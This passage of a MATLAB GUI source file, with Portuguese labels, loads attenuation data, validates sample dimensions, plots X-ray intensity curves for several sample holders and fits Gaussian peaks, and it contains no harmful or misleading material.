                         densidadeSelecionada=densidade;
                         set(handles.p42,'String',densidade)
                         end
                         tline = fgetl(fid);
                    end
                    fclose(fid);

                    achou=false;
                    for x=1:size(dadosSelecionados)
                    if(isequal(round(dadosSelecionados(x,1)),round(str2double(valorEnergia)))&& ~achou)
                        achou=true;
                        miu=dadosSelecionados(x,2)*densidadeSelecionada;                        
                        set(handles.p41,'String',miu);
                    end
                    end
                   if(mostarTabela)
                         ColunaNomes = {'(Kev)' '(cm^2/g)' 'mu(en)/rho'}; 
                         set(handles.tabela2,'ColumnName',ColunaNomes);
                         set(handles.tabela2,'Data',dadosSelecionados);
                         set(handles.tabela2, 'ColumnWidth',{40},'units','Normalized');
                   end
function aa_Callback           (~, ~, handles      )
global valorA;
valorA = str2double(get(handles.aa, 'String'));
function bb_Callback           (~, ~, handles      )
global valorB;
persistent textString;
currentString = get(handles.aa, 'String');
if (isempty(textString)|| isequal(textString,'0'))
  if ~isempty(currentString)
    textString = currentString;
  else
    uiwait(warndlg('Campo não preechido... Favor preencher com valor valido'));
  end
  return;
end

if(str2double(textString)~='NaN')
   valorB = str2double(currentString);
else
    uiwait(warndlg('Valor não correspondente... tente novamente'));
end
function hhh_Callback          (~, ~, handles      )
global valorH;
persistent textString;
currentString = get(handles.hhh, 'String');
if (isempty(textString)|| isequal(textString,'0'))
  if ~isempty(currentString)
    textString = currentString;
  else
    uiwait(warndlg('Campo não preechido... Favor preencher com valor valido'));
  end
  return;
end
if(str2double(textString)~='NaN')
   valorH = str2double(currentString);
else
    uiwait(warndlg('Valor não correspondente... tente novamente'));
end
function transfere_Callback    (hObject, ~, handles)
global caminhoDosArquivosDeTexto ...
       pastaSelecionada ...
       tipoSelecionado ...
        ;
   contents = cellstr(get(handles.listbox1,'String'));
   Arqselecionado2=      contents{get(hObject,'Value')};
  [Arqselecionado  ,~] = strsplit(Arqselecionado2 , ' [','CollapseDelimiters',true);
                         
        aux      = char(strcat(pastaSelecionada,'\',Arqselecionado(1)));
        txtSelect=strcat(caminhoDosArquivosDeTexto,aux);
        
        todosTipos        = cellstr(get(handles.paraOnde,'String')); 
        tipoSelecionado2  = todosTipos{get(handles.paraOnde,'Value')};
        txtSelect2            = char(strcat(caminhoDosArquivosDeTexto,'textData\',tipoSelecionado2));
    
        movefile(char(txtSelect),char(txtSelect2),'f');
        todosTipos = cellstr(get(handles.selecionaCaso,'String')); 
        tipoSelecionado = todosTipos{get(handles.selecionaCaso,'Value')};
        pastaSelecionada = strcat('\textData\',tipoSelecionado);
        files = dir(fullfile(caminhoDosArquivosDeTexto,pastaSelecionada,'*.txt'));
        set(handles.listbox1,'Value',1);
        
        
                todosTipos = {files.name};
        todosDAtas = {files.date};

        for x=1: length({files.name})
         dadoss{x} =   strcat(todosTipos{x},'            [',todosDAtas{x},']');
        end
        
        todosNomes=cell2struct(dadoss,'nomes',1);
 
set(handles.listbox1,'String',{todosNomes.nomes});

function modificar_Callback    (~, ~, handles      )
% hObject    handle to modificar (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global valorA ...
       valorB ...
       valorH ...
       volume ...
       Q      ...
       altura ...
       TETA   ... 
       angCritico ...
       qCritico ...
       miuAR...
       miuPVC...
       miuAMO...
       miuPA...
       lxAR...
       lxPVC...
       lxAMOS...
       lxPA...
       Tar...
       Tpvc...
       Tamos...
       Tpa...
       tab5;
   
   
       valorA = str2double(get(handles.aa, 'String'))
       valorB = str2double(get(handles.bb, 'String'))
       valorH = str2double(get(handles.hhh,'String'))
     
       okaya = false;
       okayb = false;
       okayh = false;
       mostarJanela= get(handles.PlotarEmNovaJanela,'Value');  
       hold off
       
if(isequal(num2str(valorA),'NaN')||isequal(valorA,0))
uiwait(warndlg('Medida [ a ] não computada ou igual a zero (0):                                                                   Insira Medida valida'));
elseif(~isempty(valorA)&& ~isequal(valorA,0) && ~isequal(num2str(valorA),'NaN'))
okaya = true;
valorA = str2double(get(handles.aa, 'String'));
end
 
if(isequal(num2str(valorB),'NaN')||isequal(valorB,0))
uiwait(warndlg('Medida [ b ] não computada ou igual a zero (0):                                                                   Insira Medida valida'));
elseif(~isempty(valorB)&& ~isequal(valorB,0) && ~isequal(num2str(valorB),'NaN'))
valorB = str2double(get(handles.bb, 'String'));
okayb = true;
end
  
if(isequal(num2str(valorH),'NaN')||isequal(valorH,0) )
 

    uiwait(warndlg('Medida [ h ] não computada igual a zero (0):                                                     Insira Medida valida'))
  
elseif(~isempty(valorH)&& ~isequal(valorH,0) && ~isequal(num2str(valorH),'NaN'))
if (valorH > max(altura))
aux=strcat('Medida [ h ] não computada : Maior que a altura maxima [ ',num2str(max(altura)),' ] calculada automaticamente a partir do ang. theta')
uiwait(warndlg(aux));
else
valorH = str2double(get(handles.hhh, 'String'));
okayh = true;
end
end
 
if(okaya && okayb && okayh)
 uiwait(helpdlg('Medidas alteradas com sucesso')) 
 end
 
       
             volume = (valorA*valorB).*tan(TETA(:,1).*(pi()/180));
      
             alturaCritica = str2double(get(handles.hhh,'String'))
             okay = false;
             count =0;
%                 for x=1:size(Q)
%                        x,1) = (valorA/2)*tan(Q(x,1)*(pi()/180))
%                 end
%                 
                altura = rad2deg(atan(valorA/(2*valorH)))
%   countxxx=1:Q(altura)
%   aaaa = Q(round(altura))

             for x=1:length(Q)
                if(altura< TETA(x,1) && ~okay)
                 angCritico =count
                 qCritico = Q(count,1)
                 count
                 okay = true;
                end
                 count = count+1;
             end
          
             
             
             set(handles.thetaTextedi,'String',TETA(angCritico,1))
               [miuAR,miuPVC,miuAMO,miuPA,lxAR,lxPVC,lxAMOS,lxPA,Tar,Tpvc,Tamos,Tpa] = getTodososvalores(handles,Q);

    CompX = str2double(get(handles.bb,'String'));
%     resto = 2.1 - CompX; 
%     CompX = CompX + resto;
    CompY = str2double(get(handles.aa,'String'));
    CompZ = str2double(get(handles.hhh,'String'));
    
        if(mostarJanela>0)
             hFig = figure;
        else
        ax = axes('Parent', tab5);
        cla reset
        ax.BoxStyle = 'full';
        ax.XAxisLocation = 'top';
        ax.Position = [0.1 0.4 1.0 0.6];
        
        end
    X = [ 0 ; CompX ; CompX ; 0     ; 0 ];
    Y = [ 0 ; 0     ; CompY ; CompY ; 0 ];
    Z = [ 0 ; 0     ; 0     ; 0     ; 0 ];

    if(mostarJanela>0)
    tabplot('   1   ',hFig,'top');
    grid on
    end
   
            hold on;
            plot3(X-CompX/2,Y-0.5*CompY,Z);   
            plot3(X-CompX/2,Y-0.5*CompY,Z+CompZ,'LineWidth',2.5); 
            set(gca,'View',[-50,33]);

            for k=1:length(X)-1
             plot3([X(k)-CompX/2;X(k)-CompX/2],[Y(k)-0.5*CompY;Y(k)-0.5*CompY],[0;CompZ],'LineWidth',2.5);
        end
%             scatter3(CompX*2.4*35.*rand(300,1)/100-CompX/2,CompX*2.4*35.*rand(300,1)/100- 1.5*CompY,35.*rand(300,1)/100-0.125,'red');
           axis([-max(CompX)-0.3 max(CompX)+0.3 -max(CompX)-0.3 max(CompX)+0.3 0 1]);

    if(mostarJanela>0)
    tabplot('   2   ',hFig,'top');
    axis([-max(CompX)-0.3 max(CompX)+0.3 -max(CompX)-0.3 max(CompX)+0.3 0 1]);
    grid on
    end
            grid on
            hold on
            nPhi = 256;
            nRho = 32;
            [X, Y, Z] = cylinder([linspace(0, CompX, nRho) CompX+0.1.*ones(1, nRho)], nPhi);
            Z(1:nRho,:) = 0;
            Z(nRho+1:end,:) = CompZ;
            surf(X,Y,Z, 'FaceColor', [0.97 0.97 0.97], 'FaceLighting', 'phong','EdgeColor', 'none');
            hold on
            [X,Y,Z] = cylinder(linspace(0, CompX, nRho), nPhi);
            Z(:,:) = CompZ -0.03;
            surf(X, Y, Z, 'FaceColor', [0 0.5 1], 'FaceLighting', 'phong', 'FaceAlpha',0.5, 'EdgeColor', 'none');
            camlight;
            hold off

    if(mostarJanela>0)
            tabplot('   3   ',hFig,'top');
            grid on
            axis([-max(CompX)-0.3 max(CompX)+0.3 -max(CompX)-0.3 max(CompX)+0.3 0 1]);
            hold off
            hold on;
            X = [ 0 ; CompX ; CompX ; 0     ; 0 ];
            Y = [ 0 ; 0     ; CompY ; CompY ; 0 ];
            Z = [ 0 ; 0     ; 0     ; 0     ; 0 ];
            plot3(X-CompX/2,Y-0.5*CompY,Z);   
            plot3(X-CompX/2,Y-0.5*CompY,Z+CompZ,'LineWidth',2.5); 
            set(gca,'View',[-28,35]); 

            for k=1:length(X)-1
                 plot3([X(k)-CompX/2;X(k)-CompX/2],[Y(k)-0.5*CompY;Y(k)-0.5*CompY],[0;CompZ],'LineWidth',2.5);
            end
            scatter3(7*35.*rand(300,1)/100-CompX/2,7*35.*rand(300,1)/100-3*CompY,35.*rand(300,1)/100,'g');
            nPhi = 256;
            nRho = 32;
            [X, Y, Z] = cylinder([linspace(0, CompX, nRho) CompX+0.1.*ones(1, nRho)], nPhi);
            Z(1:nRho,:) = 0;
            Z(nRho+1:end,:) = CompZ;
            surf(X,Y,Z, 'FaceColor', [0.97 0.97 0.97], 'FaceLighting', 'phong','EdgeColor', 'none');
            hold on
            [X,Y,Z] = cylinder(linspace(0, CompX, nRho), nPhi);
            Z(:,:) = CompZ -0.03;
            surf(X, Y, Z, 'FaceColor', [0 0.5 1], 'FaceLighting', 'phong', 'FaceAlpha',0.5, 'EdgeColor', 'none');
            camlight;
            hold off
    end
function listbox2_Callback     (hObject, ~, handles)
        global    pAselecionado ...
                  Arqselecionado2 ...
                  PA_04_VZ                 ...
                  PA_04_PLS                ...
                  PA_03_VZ_REP             ...
                  PA_03_PLS                ...
                  PA_02_VZ                 ...
                  PA_02_PLS                ...
                  PA_01_VZ                 ...
                  PA_01_PLS_1MIN           ...
                  PA_01_H2O_PLS_2MIN       ...
                  PA_01_H2O_PLS_1MIN       ...
                  pA01_H20_PLS ...
                  pA02_H20_PLS ...
                  pA03_H20_PLS ...
                  pA04_H20_PLS ...
                  pA01_H20_PLS_2MIN ...
                  pA02_H20_PLS_2MIN ...
                  pA03_H20_PLS_2MIN ...
                  pA04_H20_PLS_2MIN ...
                  TETA ...
                  tab4 ...
                  tabgp...
                  IAR...
                  Q;       
    hold off
    tabgp.SelectedTab = tab4;
    contents       =      cellstr(get(hObject,'String'));
    Arqselecionado2=      contents{get(hObject,'Value')};


    opc1 ='Intensidade do Porta Amostra Vazio';
    opc2 ='Intensidade do Filme';
    opc3 ='Intensidade da H20 1Min';
    opc4 ='Intensidade do Ar';


    mostarJanela= get(handles.PlotarEmNovaJanela,'Value');

axes('Parent',tab4);

if(strcmp(Arqselecionado2,opc1))
              set(handles.text14,'String',opc1);
              subplot(4,1,1)
              cla reset
              
              titlee=strcat(opc1,' - ',pAselecionado);
              if(strcmp(pAselecionado,'PA01'))
                     dataTab = [TETA Q PA_01_VZ];
                     set(handles.tabela2,'Data',dataTab);
                     plotGraficoFacil(Q,PA_01_VZ,' ',titlee);
                     axis([min(Q(:)) max(Q(:)) min(PA_01_VZ) max(PA_01_VZ)]);
                     if(mostarJanela>0)
                          figure
                          plotGraficoFacil(Q,PA_01_VZ,'Intensidades obtidas para PA01 Vazio','PA01 Vazio');
                     end                                             
              end
              if(strcmp(pAselecionado,'PA02'))
                     dataTab = [TETA Q PA_02_VZ];
                     set(handles.tabela2,'Data',dataTab);
                     plotGraficoFacil(Q,PA_02_VZ,' ',titlee);
                     axis([min(Q(:)) max(Q(:)) min(PA_02_VZ) max(PA_02_VZ)]);
                     if(mostarJanela>0)
                           figure
                           plotGraficoFacil(Q,PA_02_VZ,'Intensidades obtidas para PA02 Vazio','PA02 Vazio');
                     end         
              end
              if(strcmp(pAselecionado,'PA03'))
                     dataTab = [TETA Q PA_03_VZ_REP];
                     set(handles.tabela2,'Data',dataTab);
                     plotGraficoFacil(Q,PA_03_VZ_REP,' ',titlee);
                     axis([min(Q(:)) max(Q(:)) min(PA_03_VZ_REP) max(PA_03_VZ_REP)]);
                     if(mostarJanela>0)
                          figure
                          plotGraficoFacil(Q,PA_03_VZ_REP,'Intensidades obtidas para PA03 Vazio','PA03 Vazio');
                     end     
              end
              if(strcmp(pAselecionado,'PA04'))
                     dataTab = [TETA Q PA_04_VZ];
                     set(handles.tabela2,'Data',dataTab);
                     plotGraficoFacil(Q,PA_04_VZ,' ',titlee);
                      axis([min(Q(:)) max(Q(:)) min(PA_04_VZ) max(PA_04_VZ)]);
                     if(mostarJanela>0)
                          figure
                          plotGraficoFacil(Q,PA_04_VZ,'Intensidades obtidas para PA04 Vazio','PA04 Vazio');
                     end      
              end
   end
if(strcmp(Arqselecionado2,opc2))
                           
                           subplot(4,1,2)
                           cla reset
                           titlee=strcat(opc2,' - ',pAselecionado);
                           set(handles.text14,'String',opc2);
                          if(strcmp(pAselecionado,'PA01'))
                                dataTab = [TETA Q PA_01_PLS_1MIN];
                                set(handles.tabela2,'Data',dataTab);
                                plotGraficoFacil(Q,PA_01_PLS_1MIN,' ',titlee);
                                axis([min(Q(:)) max(Q(:)) min(PA_01_PLS_1MIN) max(PA_01_PLS_1MIN)]);
                                if(mostarJanela>0) 
                                      figure
                                      plotGraficoFacil(Q,PA_01_PLS_1MIN,'Intensidades obtidas para PA01 com Plástico','PA01 Plástico');
                                end                                            
                          end
                          if(strcmp(pAselecionado,'PA02'))
                                 dataTab = [TETA Q PA_02_PLS];
                                 set(handles.tabela2,'Data',dataTab);
                                 plotGraficoFacil(Q,PA_02_PLS,' ',titlee);
                                 axis([min(Q(:)) max(Q(:)) min(PA_02_PLS) max(PA_02_PLS)]);
                                if(mostarJanela>0) 
                                      figure
                                      plotGraficoFacil(Q,PA_02_PLS,'Intensidades obtidas para PA02 com Plástico','PA02 Plástico');
                                end                               
                          end
                          if(strcmp(pAselecionado,'PA03'))
                                 dataTab = [TETA Q PA_03_PLS];
                                 set(handles.tabela2,'Data',dataTab);     
                                 plotGraficoFacil(Q,PA_03_PLS,' ',titlee);
                                 axis([min(Q(:)) max(Q(:)) min(PA_03_PLS) max(PA_03_PLS)]);
                                if(mostarJanela>0) 
                                      figure
                                      plotGraficoFacil(Q,PA_03_PLS,'Intensidades obtidas para PA03 com Plástico','PA03 Plástico');
                                end                              
                          end
                          if(strcmp(pAselecionado,'PA04'))
                                 dataTab = [TETA Q PA_04_PLS];
                                 set(handles.tabela2,'Data',dataTab);
                                  
                                 plotGraficoFacil(Q,PA_04_PLS,' ',titlee);
                                 axis([min(Q(:)) max(Q(:)) min(PA_04_PLS) max(PA_04_PLS)]);
                                if(mostarJanela>0) 
                                      figure
                                      plotGraficoFacil(Q,PA_04_PLS,'Intensidades obtidas para PA04 com Plástico','PA04 Plástico');
                                end
                          end
end  
if(strcmp(Arqselecionado2,opc3))
    
                           subplot(4,1,3)
                           cla reset
                           titlee=strcat(opc3,' - ',pAselecionado);
                           set(handles.text14,'String',opc3);
                                dataTab = [TETA Q PA_01_H2O_PLS_1MIN];
                                set(handles.tabela2,'Data',dataTab);
                                plotGraficoFacil(Q,PA_01_H2O_PLS_1MIN,' ',titlee);
                                axis([min(Q(:)) max(Q(:)) min(PA_01_H2O_PLS_1MIN) max(PA_01_H2O_PLS_1MIN)]);
                                if(mostarJanela>0) 
                                      figure
                                       plotGraficoFacil(Q,PA_01_H2O_PLS_1MIN,'Intensidades obtidas para PA01 com H20 1MIN','PA01 H20 1MIN');
                                end                                            
end
if(strcmp(Arqselecionado2,opc4))
                                subplot(4,1,4)
                                cla reset
                                titlee=strcat(opc4);
                                set(handles.text14,'String',opc4);
                           
                                dataTab = [TETA Q IAR];
                                set(handles.tabela2,'Data',dataTab);
                                plotGraficoFacil(Q,IAR,' ',titlee);
%                                 axis([min(Q(:)) max(Q(:)) min(IAR) max(IAR)]);
                                axis tight
                                if(mostarJanela>0) 
                                      figure
                                       plotGraficoFacil(Q,IAR,'Intensidades obtidas para PA01 com H20 2MIN','PA01 H20 2MIN');
                                end                                            
end
function miu_Callback          (~, ~, ~)
function rho_Callback          (~, ~, ~)
function paraOnde_Callback     (~, ~, ~)
function console_Callback      (~, ~, ~)
function T4_Callback           (~, ~, ~)
function T1_Callback           (~, ~, ~)
function T3_Callback           (~, ~, ~)
function T2_Callback           (~, ~, ~)
function edit14_Callback       (~, ~, ~)
function edit15_Callback       (~, ~, ~)
function edit16_Callback       (~, ~, ~)
function PlotarEmNovaJanela_Callback(~, ~, ~)

%##############################################################################
%##############################################################################
%##############################################################################
%##############################################################################
function PlotarEmNovaJanela_CreateFcn(~, ~, ~)
function classifica1_CreateFcn       (~, ~, ~)
function console_CreateFcn           (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function slider3_CreateFcn           (hObject, ~, ~)
if isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor',[.9 .9 .9]);
end
function p1_CreateFcn                (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p2_CreateFcn                (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p3_CreateFcn                (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p4_CreateFcn                (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p11_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p12_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p13_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p21_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p22_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p23_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p31_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p32_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p33_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p41_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p42_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p43_CreateFcn               (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function p11_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p11,'BackgroundColor','g');
else
       set(handles.p11,'BackgroundColor','r');
end
function p12_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p12,'BackgroundColor','g');
else
       set(handles.p12,'BackgroundColor','r');
end
function p13_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p13,'BackgroundColor','g');
else
       set(handles.p13,'BackgroundColor','r');
end
function p21_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p21,'BackgroundColor','g');
else
       set(handles.p21,'BackgroundColor','r');
end
function p22_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p22,'BackgroundColor','g');
else
       set(handles.p22,'BackgroundColor','r'); 
end
function p23_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p23,'BackgroundColor','g');
else
       set(handles.p23,'BackgroundColor','r');
end
function p31_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p31,'BackgroundColor','g');
else
       set(handles.p31,'BackgroundColor','r');
end
function p32_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p32,'BackgroundColor','g');
else
       set(handles.p32,'BackgroundColor','r');
end
function p33_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p33,'BackgroundColor','g');
else
       set(handles.p33,'BackgroundColor','r');
end
function p41_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p41,'BackgroundColor','g');
else
       set(handles.p41,'BackgroundColor','r');
end
function p42_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p42,'BackgroundColor','g');
else
       set(handles.p42,'BackgroundColor','r');    
end
function p43_Callback(hObject, ~, handles)
if(~isnan(str2double(get(hObject,'String'))))
       set(handles.p43,'BackgroundColor','g');
else
       set(handles.p43,'BackgroundColor','r')     
end
function energia_Callback(~, ~, ~)
function aa_CreateFcn  (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function hhh_CreateFcn (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function bb_CreateFcn  (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end             
function listbox2_CreateFcn      (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function paraOnde_CreateFcn      (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function selecionaCaso_CreateFcn (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function popupmenu2_CreateFcn    (hObject, ~, ~)
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end
function uipanel7_CreateFcn(~, ~, ~)
global tabgp ...
       f ...
       tab1 ...
       tab2 ...
       tab3 ...
       tab4 ...
       tab5 ...
       tab3_2...
       tab3_3...
       tab3_4...
       ;
f = gcf;
tabgp  = uitabgroup(f,'Position',[0.58 .01 .4 0.90]);

tab1   = uitab(tabgp,'Title','Análise da amostra');
tab2   = uitab(tabgp,'Title','Pós - Análise');
tab3   = uitab(tabgp,'Title','Pós - Análise II');
tab3_3 = uitab(tabgp,'Title','Perfis da agua');
tab3_4 = uitab(tabgp,'Title','Perfis Tecidos');
tab4   = uitab(tabgp,'Title','Dados iniciais  ');
tab5   = uitab(tabgp,'Title','PA');
tab3_2 = uitab(tabgp,'Title','Pós - Análise III');
assignin('base','tab3_2',tab3_2)
uicontrol(tab3,'Style', 'pushbutton', 'String', 'Iterar','Callback', @iterar);
uicontrol(tab5,'Style', 'pushbutton', 'String', 'Anima' ,'Callback', @anima );   
  

function iterar(ax,bx)
global Q ...
       plotFinal ...
       tab3_2  ...
       tabgp ...
       mostarJanela ...
       TETA;
       tabgp.SelectedTab = tab3_2;
       cla reset
            x = TETA; 
            hold off
         
       
      
        if(mostarJanela>0)
            figure(77)
        else
            axes('Parent', tab3_2)
        end
        
            
        plotCorrigidoAux1 = plotFinal.*(-1);
        plotCorrigidoAux2 = plotFinal;
%         tam        = length(plotCorrigidoAux2 );
        [pks,locs] = findpeaks(plotCorrigidoAux1,Q,'MinPeakDistance',2);
        if(plotCorrigidoAux2(1)> plotCorrigidoAux2(5))
        plotCorrigidoAux2(1:locs(3),1)= (-1).*pks(1);
        end
%      
%         subplot(3,1,1)
%         plot(Q,plotCorrigidoAux2)
        
subplot(3,1,1)
            Pos = x;
            Hgt = plotCorrigidoAux2;
            cla reset
            okay=false;
            cont=0;
            entrada=0;
            inicio = 1;
            PeakSig=plotCorrigidoAux2;
%             okay=400000;
% %       
%            Hgt = plotCorrigidoAux2;
           inicio = 50;
           okay2=1E-26;
            for yy=1:2
            cla reset
            
            Wdt = Q/inicio;
            inicio = inicio*10;
            for n = 1:length(x)
                Gauss(n,:) =  Hgt(n)*exp(-((x - Pos(n))/Wdt(n)).^2);
                PeakSig=sum(Gauss);
%                 plot(Q(1:n),PeakSig(1:n),'-.')
                     if(okay==false & cont >2)
                     plot(Q,Gauss(n,:))
                         axis tight
                     hold on
                     okay=true;
                     cont=0;
                     else
                     okay=false;
                     cont=cont+1;
                     end 
                     pause(0.00005) 
            end
                 okay2=max(sum(Gauss));
% %                  
            end
            
            hold all
            plot(Q,PeakSig,'-.');
% %           
              grid on
              axis tight
entrada=0;
x = Q;

%FIANAL DO PRIMEIRO SUBPLOT
for i=1:2
    if i ==1
     fator = 100
    else
     fator = 1000;
    end
    Wdt = x/fator;

subplot(3,1,2)
        if(i<2)          cla reset;       end
    Pos = x;
    Hgt = plotCorrigidoAux2;
    okay=false;
    cont=0;
        for n = 1:length(x)
                 Gauss(n,:) =  Hgt(n)*exp(-((x - Pos(n))/Wdt(n)).^2); 
        end

                     PeakSig = sum(Gauss);
                     hold all
                     plot(x,Gauss,'.-',x,PeakSig,'-');
                     axis tight  

%          end
                hold on
                [psor,lsor] = findpeaks(PeakSig,x,'SortStr','descend');
                if(i==1)
                 PKS1=lsor;
                [k, d] = dsearchn(lsor(1),Q(:,1));
                 pico2 = min(d);
                [i,j]=ind2sub(size(d), find(d==pico2));
                 pk2=Q(i,1);
                 x2=Q(i,1);
                end
                  hold off
    grid on
    subplot(3,1,3)
% 
            if(entrada==0 )
                cla reset
                entrada=1;
                end
%                 axis([min(Q(:)) max(Q(:)) min(plotCorrigido) max(plotCorrigido)]);
                findpeaks(PeakSig,x,'MinPeakDistance',5,'WidthReference','halfheight');
            end
             pico1 = max(plotCorrigidoAux2);
            [i,j]=ind2sub(size(plotCorrigidoAux2), find(plotCorrigidoAux2==pico1));
             pk1=Q(i,1);
             x1=Q(i,1);
             y1=max(plotCorrigidoAux2);
             hold all
            [k, d] = dsearchn(pk1,PKS1);
            if( d(1) < 3)
             pk2 = PKS1(2);
             x2 = pk2;
            end
%             
            index = find(Q==pk2);
            y2 = plotCorrigidoAux2(index);  
%            
            plot((x1).*ones(length(x),1),plotCorrigidoAux2,'-.','LineWidth',2);
            plot( x1,y1+1E-25,'v',...
                                                 'LineWidth',1,...
                                                 'MarkerEdgeColor','k',...
                                                 'MarkerFaceColor',[.49 1 .63],...
                                                 'MarkerSize',10)
        
            plot((x2).*ones(length(x),1),plotCorrigidoAux2,'-.','LineWidth',2);
            plot( x2,y2+1E-25,'v',...
                                                 'LineWidth',1,...
                                                 'MarkerEdgeColor','k',...
                                                 'MarkerFaceColor',[.49 1 .63],...
                                                 'MarkerSize',10)
                                             
            str1 = ['[ ',num2str(x1),' , ',num2str(y1),' ]'];
            str2 = ['[ ',num2str(x2),' , ',num2str(y2),' ]'];
            text(x1+2,y1+1E-25,str1,'HorizontalAlignment','right');
            text(x2,0,str2,'VerticalAlignment','baseline','HorizontalAlignment','left');
            xlim([min(Q) max(Q)])
            ylim([0 y1+2E-25])
%             axis([min(Q(:)) max(Q(:)) min(plotCorrigido) max(plotCorrigido)+5E-25])
%             
            hold off
function anima (~,~)
global tab5 ...


okay=0;
if(okay==1)
fa=0.2;
SPHERE_RES =  50; % resolution for your spheres
SPHERE_RAD = fa; % radius of spheres
v = randn(200,3);
v(:,1)=v(:,1)*0.4;
v(:,2)=v(:,2)*0.5;
v(:,3)=v(:,3)*0.05;
% Make base sphere data
[xb, yb, zb] = sphere(SPHERE_RES);
% 
% h = 0.5*[xb, yb, zb]
% Make a figure
xb = 8*30.*xb/100;
yb = 6*30.*yb/100;
zb = zb;
hold on;
% Plot spheres

for i=1:1:length(v)
    if(i<150)
    surf(SPHERE_RAD*xb+v(i,1), SPHERE_RAD*yb+v(i,2), SPHERE_RAD*zb+v(i,3), 'facecolor', 'y', 'edgealpha', 0);
%     surf(SPHERE_RAD*xb+v(i,1)-0.21, SPHERE_RAD*yb+v(i,2)-0.21, SPHERE_RAD*zb+v(i,3), 'facecolor', 'y', 'edgealpha', 0);
%     surf(SPHERE_RAD*xb+v(i,1)+0.21, SPHERE_RAD*yb+v(i,2)+0.21, SPHERE_RAD*zb+v(i,3), 'facecolor', 'y', 'edgealpha', 0);
    else
